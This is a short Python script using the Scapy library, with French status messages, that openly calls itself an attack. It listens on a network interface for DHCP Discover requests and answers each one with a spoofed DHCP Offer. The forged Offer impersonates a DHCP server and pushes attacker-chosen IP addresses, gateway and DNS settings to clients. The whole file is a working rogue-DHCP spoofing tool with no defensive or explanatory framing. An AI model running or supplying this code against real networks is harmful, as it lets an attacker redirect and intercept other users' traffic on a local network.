from scapy.all import *

IFACE = "eth0"
OFFERED_IP = ["10.1.10.250","10.1.10.251", "10.1.10.252", "10.1.10.253"]
SERVER_IP = "10.1.10.20"
ROUTER = "10.1.10.254"
DNS = "1.1.1.1"

def handle_dhcp(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
        client_mac = pkt[Ether].src
        transaction_id = pkt[BOOTP].xid
        print(f"[*] Discover détecté de {client_mac} (ID: {hex(transaction_id)})")

        spoofed_offer = (
            Ether(src=get_if_hwaddr(IFACE), dst="ff:ff:ff:ff:ff:ff") /
            IP(src=SERVER_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=OFFERED_IP, siaddr=SERVER_IP, xid=transaction_id, chaddr=pkt[BOOTP].chaddr) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", SERVER_IP),
                ("subnet_mask", "255.255.255.0"),
                ("router", ROUTER),
                ("name_server", DNS),
                ("lease_time", 43200),
                "end"
            ])
        )

        sendp(spoofed_offer, iface=IFACE, verbose=0)
        print(f"[+] Offer envoyé : {OFFERED_IP} proposé à {client_mac}")

print(f"--- Attaque méchante méchante sur {IFACE} ---")
sniff(iface=IFACE, filter="udp and port 67", prn=handle_dhcp, store=0)
